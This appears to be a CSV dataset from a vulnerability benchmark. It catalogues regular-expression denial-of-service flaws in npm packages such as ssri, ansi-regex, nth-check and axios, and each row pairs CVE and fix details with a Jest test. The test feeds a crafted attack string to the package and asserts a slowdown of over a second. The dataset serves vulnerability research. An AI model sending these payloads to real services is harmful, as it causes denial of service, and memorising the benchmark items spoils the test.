Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
redos,,revalidator,0.3.1,,redos/revalidator_0.3.1,"test(""ReDos in revalidator"", () => {
  const revalidator = require(""revalidator"");
  const measureTime = require(""../utils"").measureTime;
  var myObj = {
    url: ""ftp://0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0."",
  };
  let t = measureTime(function () {
    revalidator.validate(myObj, {
      properties: {
        url: {
          description: ""the url the object should be stored at"",
          type: ""string"",
          format: ""url"",
          required: true,
        },
      },
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,revalidator.js:289:19,https://securitylab.github.com/advisories/GHSL-2020-352-redos-revalidator/; 
redos,,github-url-to-object,4.0.2,4.0.4,redos/github-url-to-object_4.0.2,"test(""ReDos in github-url-to-object"", () => {
  const measureTime = require(""../utils"").measureTime;
  const gh = require(""github-url-to-object"");
  let prefix = ""a/a"";
  let pump = ""a"";
  let suffix = ""a/"";
  let attackString = prefix;
  for (let i = 0; i < 25000; i++) {
    attackString += pump;
  }
  attackString += suffix;
  let t = measureTime(function () {
    gh(attackString);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,commonjs.js:19:27,https://security.snyk.io/vuln/npm:github-url-to-object:20180226; 
redos,CVE-2021-27290,ssri,8.0.0,8.0.1,redos/ssri_8.0.0,"test(""ReDos in ssri"", () => {
  const measureTime = require(""../utils"").measureTime;
  const ssri = require(""ssri"");
  const integrity =
    ""sha512-00000000000000000000000000000000000000000000"" +
    ""?"".repeat(25) +
    ""\x1F"";
  let t = measureTime(function () {
    const parsed = ssri.parse(integrity, {
      strict: true,
      single: true,
    });
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/npm/ssri/commit/76e223317d971f19e4db8191865bdad5edee40d2,index.js:123:31,https://security.snyk.io/vuln/SNYK-JS-SSRI-1246392; https://github.com/advisories/GHSA-vx3p-948g-6vhq
redos,CVE-2017-16116,string,3.3.3,,redos/string_3.3.3,"test(""ReDos in string"", () => {
  const genstr = require(""../utils"").genstr;
  const measureTime = require(""../utils"").measureTime;
  const string = require(""string"");
  let t = measureTime(function () {
    string(genstr(50000, ""9"")).underscore();
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,string.js:618:68,https://security.snyk.io/vuln/npm:string:20170907; https://github.com/advisories/GHSA-g36h-6r4f-3mqp
redos,CVE-2021-3807,ansi-regex,4.1.0,>=2.1.1 <3.0.1 >=4.0.0 <4.1.1 >=5.0.0 <5.0.1 >=6.0.0 <6.0.1,redos/ansi-regex_4.1.0,"test(""ReDos in ansi-regex"", () => {
  const ansiRegex = require(""ansi-regex"");
  const measureTime = require(""../utils"").measureTime;
  var attack_str = ""\u001B[""+"";"".repeat(2*10000);
  let t = measureTime(function () {
    ansiRegex().test(attack_str); 
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/chalk/ansi-regex/commit/419250fa510bf31b4cc672e76537a64f9332e1f1,,https://security.snyk.io/vuln/SNYK-JS-ANSIREGEX-1583908; 
redos,,checkit,0.7.0,,redos/checkit_0.7.0,"test(""ReDoS in checkit"", () => {
  const measureTime = require(""../utils"").measureTime;
  const check = require(""checkit"");
  const prefix = ""http://a"";
  const pump = ""a"";
  const suffix = ""\t"";
  const nPumps = 1000000;
  let url = prefix;
  for (let i = 0; i < nPumps; i++) {
    url += pump;
  }
  url += suffix;
  let t = measureTime(function () {
    check(url);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/tgriesser/checkit/pull/94,,https://security.snyk.io/vuln/npm:checkit:20180226; 
redos,,remove-markdown,0.3.0,,redos/remove-markdown_0.3.0,"test(""ReDos in remove-markdown"", () => {
  const measureTime = require(""../utils"").measureTime;
  const removeMarkdown = require(""remove-markdown"");
  const paragraph =
    '\n## This is a long ""' + "" "".repeat(200) + '"" heading ##\n';
  let t = measureTime(function () {
    removeMarkdown(paragraph);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:48:8,https://security.snyk.io/vuln/SNYK-JS-REMOVEMARKDOWN-73635; 
redos,CVE-2021-3803,nth-check,2.0.0,2.0.1,redos/nth-check_2.0.0,"//https://huntr.dev/bounties/8cf8cc06-d2cf-4b4e-b42c-99fafb0b04d0/
test(""ReDos in nth-check"", () => {
  const measureTime = require(""../utils"").measureTime;
  const nthCheck = require(""nth-check"");

  let attack_str = ""2n"" + "" "".repeat(50000) + ""!"";

  let t = measureTime(function () {
    try {
      nthCheck.parse(attack_str);
    } catch (e) {}
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
",https://github.com/fb55/nth-check/commit/9894c1d2010870c351f66c6f6efcf656e26bb726,parse.js:22:26,https://github.com/advisories/GHSA-rp65-9cf3-cjxr; https://security.snyk.io/vuln/SNYK-JS-NTHCHECK-1586032
redos,CVE-2020-7753,trim,0.0.1,0.0.3,redos/trim_0.0.1,"test(""ReDos in trim"", () => {
  const measureTime = require(""../utils"").measureTime;
  const trim = require(""trim"");
  let t = measureTime(function () {
    trim(""1"" + "" "".repeat(50000) + ""1"");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",,index.js:5:14,https://security.snyk.io/vuln/SNYK-JS-TRIM-1017038; https://github.com/advisories/GHSA-w5p7-h5w8-2hfq
redos,CVE-2021-3749,axios,0.21.0,0.21.3,redos/axios_0.21.0,"function build_blank(n) {
  var ret = ""1"";
  for (var i = 0; i < n; i++) {
    ret += "" "";
  }
  return ret + ""1"";
}
test(""ReDoS in axios"", () => {
  const { trim } = require(""axios/lib/utils"");
  const measureTime = require(""../utils"").measureTime;
  let t = measureTime(function () {
    trim(build_blank(50000));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
",https://github.com/axios/axios/commit/5b457116e31db0e88fede6c428e969e87f290929,utils.js:190:34,https://security.snyk.io/vuln/SNYK-JS-AXIOS-1579269; https://github.com/advisories/GHSA-cph5-m8f7-6c5x
